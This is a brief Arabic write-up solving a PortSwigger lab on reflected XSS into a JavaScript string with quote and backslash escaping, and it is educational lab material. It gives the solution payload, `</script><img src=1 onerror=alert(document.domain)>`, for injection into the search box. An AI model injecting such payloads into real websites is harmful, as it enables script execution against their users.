# [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

## **`الهدف`**
قم بتنفيذ هجوم `XSS` يهرب من السلسلة النصية لـ `JS` ويستدعي دالة `alert`.
## **`خطوات الحل`**
نقوم بحقن الأمر التالي فى خانة البحث ونضغط `Search` لننتهي من حل اللاب.
```html
</script><img src=1 onerror=alert(document.domain)>
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Reflected XSS into HTML context with nothing encoded](./Reflected-XSS-into-HTML-context-with-nothing-encoded.md)
